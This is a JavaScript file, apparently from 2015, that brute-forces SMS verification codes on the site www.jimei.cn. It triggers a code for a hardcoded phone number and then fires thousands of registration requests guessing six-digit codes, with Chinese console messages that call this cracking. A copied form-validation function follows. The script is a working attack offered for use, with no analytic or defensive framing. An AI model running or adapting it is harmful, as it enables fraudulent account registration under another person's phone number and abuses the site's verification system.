/**
 * Created by Administrator on 2015/9/23.
 */



var PL = function (tel) {
    var self = this;
    this.tel = tel;
    this.yzm = null;
    this.thread = 10;
    this.handleNum = 0;
    this.setYzm = function () {
        $.ajax({
            url: "http://www.jimei.cn/verifyCode",
            data: "phone=" + self.tel + "&date=" + new Date().getTime(),
            type: "get",
            dataType: "json",
            success: function () {
                console.log("1：获取验证码 等待暴利破解！");
            }
        });
    }
    this.setYzm();
    this.setThread = function () {
        console.info("开启" + this.thread + "个线程");
        this.handleNum = Math.ceil(999999 / this.thread);
        console.info("平均分配线程个数为：" + this.handleNum + "个");
    }
    this.setThread();
    this.pj = function (yzm) {
        $.ajax({
            url: "http://www.jimei.cn/isuserregiste.html",
            data: {
                "phone": self.tel,
                "password": "jimeijiaju",
                "pwdconfirm": "jimeijiaju",
                "verifyCode": yzm
            },
            type: "get",
            dataType: "json",
            success: function (data) {
                console.log($(data).find("#sign").find(".failure").html() + "  当前index：" + yzm);
            }
        });
        console.info("破解验证码：" + yzm);
    };
    this.timer = null;
    this.init = function () {
        var flag = false;
        setTimeout(function () {

            (function (i) {
                for (var k = 1; k < self.handleNum; k++) {
                    (function (u) {
                        self.pj(i * 100000 + u);
                    })(k);
                    //console.info("k:" + i * 100000 + k)
                }
            })(1);
        },200);
        setTimeout(function () {
            (function (i) {
                for (var k = 1; k < self.handleNum; k++) {
                    (function (u) {
                        self.pj(i * 100000 + u);
                    })(k);
                    //console.info("k:" + i * 100000 + k)
                }
            })(2);

        },300);
     /*   for (var i = 1; i < this.thread; i++) {


            (function (i) {
                for (var k = 1; k < self.handleNum; k++) {
                    (function (u) {
                        self.pj(i * 100000 + u);
                    })(k);

                    //console.info("k:" + i * 100000 + k)
                }
            })(i);


            console.info("启动线程：" + i);


            /!*(function (i) {
             var func = function (startNum) {
             var start = startNum;
             return function (endNum) {
             for (var j = start; j < endNum; j++) {
             self.pj(j);
             }
             }
             }
             func(i * 1000)((i + 1) * 10000);
             })(i);*!/

        }*/
    }
    setTimeout(function () {
        self.init();
    }, 3000)

}
PL.start = function (tel) {
    new PL(tel);
}
PL.start('15801606666');

function regValidate() {
    var phone = /^[1][3,4,5,7,8][0-9]{9}$/;
    //帐户
    if ($("#rname").val() == "") {
        $("#rnameTip").html("作为用户名的手机号不能为空");
        return "1";
    }
    if (!(phone.test($("#rname").val()))) {
        $("#rnameTip").html("请输入正确手机号作为用户名");
        return "1";
    }

    //验证码
    if ($("#rcode").val() == "") {
        $("#rcodeTip").html("请输入验证码");
        return "1";
    }

    if (!(/^\d{6,6}$/.test($("#rcode").val()))) {
        $("#rcodeTip").html("请输入正确验证码");
        return "1";
    }
    var rightCode = false;
    $.ajax({
        async: false,
        url: "http://www.jimei.cn/register!ajaxCheckCode.action",
        data: "safecode=" + $("#rcode").val() + "&date=" + new Date().getTime(),
        type: "get",
        dataType: "json",
        success: function (data) {
            rightCode = data.flag;
        }
    });
    if (!rightCode) {
        $("#rcodeTip").html("请输入正确验证码");
        return "1";
    }
    $("#rcodeTip").html("");


    $("#rcodeTip").html("");
    return "0";
}
